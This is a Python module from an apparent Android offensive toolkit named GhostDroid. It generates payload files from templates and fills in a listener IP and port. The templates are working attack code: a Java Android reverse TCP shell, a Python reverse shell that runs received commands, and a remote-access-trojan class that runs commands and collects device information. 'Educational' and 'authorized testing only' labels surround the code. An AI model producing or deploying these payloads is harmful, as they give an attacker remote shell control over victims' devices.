import time
import os
import json
from typing import Dict, Any, List
from core.module_loader import BaseModule, ModuleMetadata
from core.ui import print_status, console, print_table, print_panel, hacker_input, show_progress

PAYLOAD_TEMPLATES = {
    "android_reverse_tcp": {
        "name": "Android Reverse TCP",
        "type": "reverse_shell",
        "platform": "android",
        "description": "Creates a reverse TCP connection to attacker",
        "risk": "critical",
        "code": """
package com.ghostdroid.pay;

import java.io.*;
import java.net.*;

public class Main {
    public static void main(String[] args) {
        try {
            Socket s = new Socket("{LHOST}", {LPORT});
            Process p = Runtime.getRuntime().exec("sh");
            new Thread(() -> {
                try {
                    BufferedReader reader = new BufferedReader(
                        new InputStreamReader(s.getInputStream()));
                    PrintWriter writer = new PrintWriter(
                        p.getOutputStream(), true);
                    String line;
                    while ((line = reader.readLine()) != null) {
                        writer.println(line);
                    }
                } catch(Exception e) {}
            }).start();
            p.getInputStream().transferTo(s.getOutputStream());
        } catch(Exception e) {}
    }
}
""",
    },
    "simulated_meterpreter": {
        "name": "Simulated Meterpreter Payload",
        "type": "staged_payload",
        "platform": "android",
        "description": "Educational simulated meterpreter payload for training",
        "risk": "critical",
        "code": """# Educational Payload - DO NOT USE MALICIOUSLY
# This is a simulated meterpreter-like payload for training

import socket
import subprocess
import threading
import os

def connect(lhost, lport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    while True:
        cmd = s.recv(1024).decode().strip()
        if cmd.lower() == 'exit':
            break
        output = subprocess.run(cmd, shell=True,
            capture_output=True, text=True)
        s.send(output.stdout.encode() + output.stderr.encode())
    s.close()

if __name__ == '__main__':
    connect('{LHOST}', {LPORT})
""",
    },
    "educational_rat": {
        "name": "Educational RAT Simulation",
        "type": "rat",
        "platform": "cross_platform",
        "description": "Simulated RAT payload for educational demonstrations",
        "risk": "critical",
        "code": """# EDUCATIONAL RAT SIMULATION - TRAINING ONLY
# This demonstrates basic RAT functionality for learning

import subprocess
import threading
import queue
import time

class GhostDroidRAT:
    def __init__(self):
        self.commands = queue.Queue()
        self.results = {}

    def execute_command(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True,
                capture_output=True, text=True, timeout=30)
            return result.stdout or result.stderr
        except Exception as e:
            return str(e)

    def persistent_access(self):
        while True:
            cmd = self.commands.get()
            if cmd == 'exit':
                break
            self.results[time.time()] = self.execute_command(cmd)

    def collect_device_info(self):
        info = {}
        info['hostname'] = subprocess.run(['hostname'],
            capture_output=True, text=True).stdout.strip()
        info['user'] = subprocess.run(['whoami'],
            capture_output=True, text=True).stdout.strip()
        info['os'] = subprocess.run(['uname', '-a'],
            capture_output=True, text=True).stdout.strip()
        return info
""",
    },
}


class PayloadGeneratorModule(BaseModule):
    metadata = ModuleMetadata(
        name="payload_generator",
        version="1.0.0",
        description="Generate educational payload templates for security training",
        author="GhostDroid",
        risk_level="critical",
        requires_adb=False,
        category="payload",
    )

    def run(self, *args, **kwargs) -> Dict[str, Any]:
        console.print("[bold cyan]╔══ Payload Generator ══╗[/]")
        console.print("[dim]Educational payload templates for authorized testing[/]\n")

        action = kwargs.get("action", "list")
        payload_name = kwargs.get("payload_name")

        if action == "list":
            return self._list_payloads()
        elif action == "generate" and payload_name:
            lhost = kwargs.get("lhost") or hacker_input("[cyan]LHOST (listener IP)[/]")
            lport = kwargs.get("lport") or hacker_input("[cyan]LPORT (listener port)[/]", password=True)
            return self._generate_payload(payload_name, lhost, lport)
        else:
            return self._interactive_menu()

    def _list_payloads(self) -> Dict:
        print_status("Available payload templates:", "info")
        rows = []
        for name, tmpl in PAYLOAD_TEMPLATES.items():
            rows.append([
                name,
                tmpl["type"],
                tmpl["platform"],
                tmpl["description"][:40],
                f"[red]{tmpl['risk']}[/]",
            ])
        print_table(
            "Payload Templates",
            ["Name", "Type", "Platform", "Description", "Risk"],
            rows,
            "cyan"
        )
        return {"payloads": list(PAYLOAD_TEMPLATES.keys())}

    def _generate_payload(self, name: str, lhost: str, lport: str) -> Dict:
        if name not in PAYLOAD_TEMPLATES:
            print_status(f"Payload '{name}' not found", "error")
            return {"error": "Payload not found"}

        template = PAYLOAD_TEMPLATES[name]
        console.print(f"\n[bold yellow][*] Generating payload: {name}[/]")
        show_progress("Generating payload", 1.0)

        code = template["code"].replace("{LHOST}", lhost).replace("{LPORT}", lport)

        output_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)),
                                   "payloads", "generated")
        os.makedirs(output_dir, exist_ok=True)

        filename = f"{name}_{lhost}_{lport}.txt"
        filepath = os.path.join(output_dir, filename)
        with open(filepath, "w") as f:
            f.write(f"# GhostDroid Generated Payload\n")
            f.write(f"# Template: {name}\n")
            f.write(f"# LHOST: {lhost}\n")
            f.write(f"# LPORT: {lport}\n")
            f.write(f"# GENERATED: {time.ctime()}\n")
            f.write("# WARNING: For authorized testing only\n")
            f.write("#" * 60 + "\n\n")
            f.write(code)

        print_status(f"Payload saved to: {filepath}", "success")

        print_panel(
            f"[bold]Payload:[/] {template['name']}\n"
            f"[bold]Type:[/] {template['type']}\n"
            f"[bold]LHOST:[/] {lhost}\n"
            f"[bold]LPORT:[/] {lport}\n"
            f"[bold]File:[/] {filepath}\n\n"
            f"[red]⚠ WARNING: This is for authorized testing only![/]",
            title="Generated Payload",
            style="red",
        )

        return {
            "name": name,
            "lhost": lhost,
            "lport": lport,
            "filepath": filepath,
            "code": code,
        }

    def _interactive_menu(self) -> Dict:
        self._list_payloads()
        name = hacker_input("[cyan]Enter payload name to generate[/]")
        lhost = hacker_input("[cyan]LHOST (listener IP)[/]")
        lport = hacker_input("[cyan]LPORT (listener port)[/]", password=True)
        return self._generate_payload(name, lhost, lport)
